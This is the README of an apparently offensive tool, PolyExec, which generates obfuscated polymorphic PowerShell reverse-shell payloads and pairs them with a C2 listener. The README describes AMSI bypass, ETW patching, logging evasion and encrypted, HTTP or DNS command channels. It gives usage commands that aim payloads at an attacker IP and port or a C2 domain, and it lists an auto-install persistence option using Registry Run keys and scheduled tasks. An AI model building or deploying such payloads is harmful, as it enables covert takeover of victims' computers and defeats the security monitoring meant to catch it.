## PolyExec: Generate polymorphic ps payloads and catch the shells in an aes-256 tunnel. 

#### polyexecgen.py - Generate obfuscated PS payloads <br>
#### c2_catcher.py - Receive the encrypted tunnel

--- 

### C2 Shell Catcher: <br>

TCP - Basic reverse shell (simple)<br>
Encrypted - AES-256 encrypted TCP (normal)<br>
HTTP - HTTP/HTTPS (80 or 443)<br>
DNS - DNS(sneaky)<br>
AES-256<br>
multi session threaded<br>
custom keys<br>

### Evasion features:<br>
AMSI bypass<br>
ETW patching<br>
scriptBlock log bypass<br>
prng variable names<br>
junk code<br>
no two payloads alike<br>
Traffic jitter<br>

---

### PolyExec Gen Usage:

##### Encrypted shell -- full evasion:

    ./polyexecgen.py -t 192.168.1.5 -p 6969 -m encrypted -k mygoodpassword
    
##### basic TCP shell:

    ./polyexecgen.py -t 192.168.1.5 -p 6969 -m tcp
    
##### HTTP --  web traffic:

    ./polyexecgen.py -t http://192.168.1.5:6969/shell -m http -k myk3y
    
##### DNS C2 (sneaky):

    ./polyexecgen.py -m dns --dns-domain c2.example.com


### C2 Catcher Usage:
##### (to listen on privileged ports...< 1024, like 443 or 80), you need to run as sudo)

##### Encrypted listener

    $ python3 c2_catcher.py
    
    # Select 1 for encrypted Listener
    # Enter encryption key: myg00dpassw0rd (same as payload key)
    
#### Standard TCP listener

    $ python3 c2_catcher.py
   
    # Select [2] for Standard Listener
    # Enter port: 6969
    
#### Config

    $ python3 c2_catcher.py
    
    # Select 3, add host/port/encryption setting

<br>

---


#### Persistance:

 payload w/ auto install persistence:
 
    ./polyexecgen.py -t 192.168.1.5 -p 6969 -m encrypted --persist
    
Puts data on disk<br>
Registry Run key<br>
Scheduled task at logon<br>
File copy to %APPDATA%<br>
 
---

#### ideas borrowed from cool humans: <br>

@danielbohannon  <br>
@harmj0y  <br>
@enigma0x3  <br>
 <br>
